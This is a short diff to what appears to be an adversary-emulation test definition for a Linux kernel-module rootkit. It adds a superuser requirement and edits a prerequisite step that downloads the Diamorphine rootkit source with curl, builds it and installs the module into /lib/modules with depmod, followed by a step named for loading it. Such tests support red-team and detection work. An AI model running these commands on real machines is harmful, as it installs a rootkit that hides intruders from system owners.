@@ -21,16 +21,17 @@ mitre:
 requirements:
     platforms:
         - os: linux
+    superuser: true
 steps:
     - name: |
         The kernel module must exist on disk at specified location (#{rootkit_name}.ko)
       inline: |
-        if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else {mkdir -p /tmp/atomic && cd /tmp/atomic
+        if [ -f /lib/modules/$(uname -r)/{{.Args.rootkit_name}}.ko ]; then exit 0; else  {mkdir -p /tmp/atomic && cd /tmp/atomic
         curl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd Diamorphine-#{rev}
         make
         sudo cp #{rootkit_name}.ko /lib/modules/$(uname -r)/
         sudo depmod -a
-        }; fi;
+        } ; fi;
       executor: bash
     - name: loadable-kernel-module-based-rootkit-(diamorphine)
       inline: |
